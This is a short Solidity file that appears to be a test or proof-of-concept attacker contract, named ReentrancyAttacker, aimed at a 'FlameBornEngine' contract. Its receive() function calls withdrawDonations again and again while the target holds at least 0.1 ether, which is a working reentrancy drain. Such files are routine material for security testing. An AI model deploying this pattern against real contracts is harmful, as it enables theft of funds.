// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IFlameBornEngine {
    function withdrawDonations(address to) external;
}

contract ReentrancyAttacker {
    IFlameBornEngine public engine;
    
    constructor(address _engine) {
        engine = IFlameBornEngine(_engine);
    }
    
    function attack() external payable {
        engine.withdrawDonations(address(this));
    }
    
    receive() external payable {
        if (address(engine).balance >= 0.1 ether) {
            engine.withdrawDonations(address(this));
        }
    }
}
